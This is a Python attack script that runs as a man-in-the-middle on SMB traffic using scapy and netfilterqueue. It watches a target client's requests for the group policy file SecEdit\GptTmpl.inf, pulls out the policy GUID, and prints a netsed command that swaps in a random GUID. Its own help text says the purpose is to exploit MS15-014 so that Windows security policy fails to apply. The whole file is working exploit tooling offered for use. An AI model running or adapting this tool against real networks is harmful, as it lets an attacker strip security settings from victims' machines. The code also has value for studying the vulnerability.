import binascii
from scapy.all import *
from netfilterqueue import NetfilterQueue
import argparse
import uuid
import os

def get_hexstring_without_trailing_zeros(hex_string):
    hex_list = [hex_string[i:i + 2] for i in range(0, len(hex_string), 2)]
    for item in hex_list[::-1]:
        if item != "00":
            break
        hex_list.pop()

    return ''.join(hex_list)

def get_gp_filename_from_hex_string(hex_string):
    hex_list = [hex_string[i:i + 2] for i in range(0, len(hex_string), 2)]
    char_list = [chr(int(x, 16)) for x in hex_list[0::2]]

    return ''.join(char_list)

def ascii_to_smb_hexstring(ascii_string, net_sed = False):
    hex_string = ""
    if not net_sed:
        ex_char = ""
    else:
        ex_char = "%"

    for char in ascii_string:
        hex_string = hex_string + ex_char + format(ord(char), "x") + ex_char + "00"

    return hex_string

def alter_packet(packet):
    exit_program = False
    payload = packet.get_payload()

    pkt = IP(payload)

    source_ip = pkt.getlayer("IP").src
    dest_ip = pkt.getlayer("IP").dst

    raw_packet = bytes(pkt)
    raw_string = binascii.hexlify(raw_packet).decode('utf-8')
    if source_ip == client_ip:
        # create file action (0500)
        match = re.search(r'fe534d42[0-9a-f]{16}0500', raw_string)
        if match:
            end = match.span()[1]
            smb_header_and_message = raw_string[end - 28:]
            header_length = smb_header_and_message[8:12]
            hex = get_hexstring_without_trailing_zeros(header_length)
            dec = int(hex, 16)
            smb_message = smb_header_and_message[dec*2:]
            # length of the filename for the create request file
            hex_file_length = get_hexstring_without_trailing_zeros(smb_message[92:96])
            file_length = int(hex_file_length, 16)
            file_name_hex_string =  smb_message[112:(112+(file_length*2))]
            file_name = get_gp_filename_from_hex_string(file_name_hex_string)
            # security policy found!
            if file_name.endswith("\SecEdit\GptTmpl.inf"):
                sec_policy_name_end = ascii_to_smb_hexstring("\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf", True)
                sec_list = file_name.split("\\")
                uuid_orig = sec_list[2]
                uuid_hex = ascii_to_smb_hexstring(uuid_orig)
                fake_uuid = "{" + str(uuid.uuid4()).upper() + "}"
                fake_uuid_hex = ascii_to_smb_hexstring(fake_uuid)
                search = ascii_to_smb_hexstring(uuid_orig, True) + sec_policy_name_end
                replace = ascii_to_smb_hexstring(fake_uuid, True) + sec_policy_name_end
                netsed_command = "netsed tcp 446 0 445 s/" + search + "/" + replace
                print ("Security UUID " + uuid_orig + " (" + uuid_hex + ") found!")
                print ("Random replacement UUID: " + fake_uuid + " (" + fake_uuid_hex + ")" )
                print("Outputting netsed command:")
                print(netsed_command)
                print("")
                exit_program = True
    packet.accept()
    if exit_program:
        nfqueue.unbind()
        try:
            sys.exit(1)
        except SystemExit:
            print("Exited")
            os._exit(1)

conf.sniff_promisc = False

parser = argparse.ArgumentParser(description='Find the SecEdit\GptTmpl.inf UUID to exploit MS15-014')
parser.add_argument('-i','--ip-address', help='ip address of the client', required=True)

args = vars(parser.parse_args())
client_ip = args['ip_address']

nfqueue = NetfilterQueue()
nfqueue.bind(1, alter_packet)
try:
    print("Waiting for group policy traffic...")
    nfqueue.run()
except KeyboardInterrupt:
    pass